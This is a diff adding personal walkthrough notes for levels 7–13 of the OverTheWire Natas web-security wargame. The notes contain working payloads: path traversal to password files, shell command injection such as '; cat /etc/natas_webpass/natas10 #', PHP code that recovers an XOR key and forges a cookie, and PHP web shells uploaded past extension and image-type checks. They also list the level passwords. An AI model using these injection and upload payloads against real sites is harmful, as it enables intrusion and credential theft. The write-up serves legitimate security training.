@@ -112,13 +112,293 @@ ________________________________________________________________________________
 
 Level 7
 
-  
-_____________________________________________________________________________________
+comment in source:
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+-> DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 _____________________________________________________________________________________
 
-_____________________________________________________________________________________
+Level 8
+
+check out source:
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+
+hex2ascii -> ==QcCtmMml1ViV3b
+terminal:
+echo ==QcCtmMml1ViV3b | rev | base64 -d -> oubWYf2kBq%
+
+input oubWYf2kBq ->
+Access granted. The password for natas9 is
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 _____________________________________________________________________________________
+
+Level 9
+
+from source code we have a php passthru that key us give unix
+commands with $key as input.
+
+    passthru("grep -i $key dictionary.txt");
+
+In unix semicolon would run the following command no matter
+what the exit code of the first command is.
+
+for example:
+$ this_is_not_a_command echo hej
+-> zsh: command not found: this_is_not_a_command
+$ this_is_not_a_command ; echo hej
+-> zsh: command not found: this_is_not_a_command
+-> hej
+
+In unix hashtag is a comment.
+
+this command:
+  grep -i ; ls -al # dictionary.txt
+
+will execute
+  ls -al -> dictionary.txt
+
+Remember  /etc/natas_webpass/natas8.
+maybe there is a  /etc/natas_webpass/natas10.
+
+; cat /etc/natas_webpass/natas10 #
+-> nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+_____________________________________________________________________________________
+
+Level 10
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+
+preg_match('/(foo)(bar)(baz)/', $key) searches to match
+the given expression. This means that now we can use
+the charaters [;|&].
+
+So we have to use grep differently. grep works the
+following way:
+  grep OPTION PATTERN DOCUMENT
+
+the reqular expression . means everything.
+
+so we can use grep and search for everything in the pw folder.
+
+grep -i . /etc/natas_webpass/natas11 # dictionary.txt
+
+  . /etc/natas_webpass/natas11 # -> U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+_____________________________________________________________________________________
+
+Level 11
+
+<?
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i < strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+
+?>
+
+
+There is a cookie:
+  data : ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+
+There is a variable:
+  $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+
+Remember that:  plaintext XOR ciphertext = key
+
+The trick is to see that:
+  plaintext = $defaultdata
+  ciphertext = cookie
+
+$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+
+We can xor the dafaultdata with the cookie data and get the key.
+
+<?php
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+$cookiedata = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw";
+$bdec = base64_decode($cookiedata);
+$jsonndec = json_encode($defaultdata, true);
+$key = $jsonndec;
+$text = $bdec;
+$outText = '';
+// Iterate through each character
+for($i=0;$i < strlen($text);$i++) {
+    $outText .= $bdec[$i] ^ $key[$i % strlen($key)];
+}
+echo $outText;
+>
+    ->  qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+
+the code must be qw8J
+
+Now to tamper with the ciphertext we need to look at the saveData
+function:
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+<?php
+$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+$json = json_encode($defaultdata, true);
+$key = "qw8J";
+$text = $json;
+$outText = '';
+// Iterate through each character
+for($i=0;$i < strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+}
+$enc = base64_encode($outText);
+echo $enc;
+>
+    -> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+insert this as a cookie and refresh ->
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+_____________________________________________________________________________________
+
+Level12
+
+You can upload a file. When you upload the file the filename and the
+file extention is changed. You can then after change the file extention before
+you send the file. This can be done by changing the form value name.extention
+because it only changes the name and doesn't check for the extention.
+so you can upload any filetype we want.
+
+uload hack.php -> 1ih1241iu.php
+
+<?php
+  echo exec('cat /etc/natas_webpass/natas13');
+?>
+
+-> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+_____________________________________________________________________________________
+
+
+Level 13
+
+Same task at level 12, exept now the  y check the file type with exif_imagetype().
+
+PHP Documentation:
+exif_imagetype() -> reads the first bytes of an image and checks its signature.
+
+WIKI JPEG:
+First four bytes: 0xFF, 0xD8 0xFF, 0xC0
+
+create file hack.jpg:
+<?php
+  echo exec('cat /etc/natas_webpass/natas14');
+?>
+
+open GHEX and prepend the bytes.
+
+I couldn't prepend them so I started the file with 4 spaces
+and edited them.
+
+file hej.JPG -> hej.JPG: JPEG image data
+
+upload file, change extention in the form to php.
+
+send -> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+
+
+_____________________________________________________________________________________
+
+
+
+_____________________________________________________________________________________
+
+
+
+_____________________________________________________________________________________
+
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
+
+_____________________________________________________________________________________
+
 
 _____________________________________________________________________________________
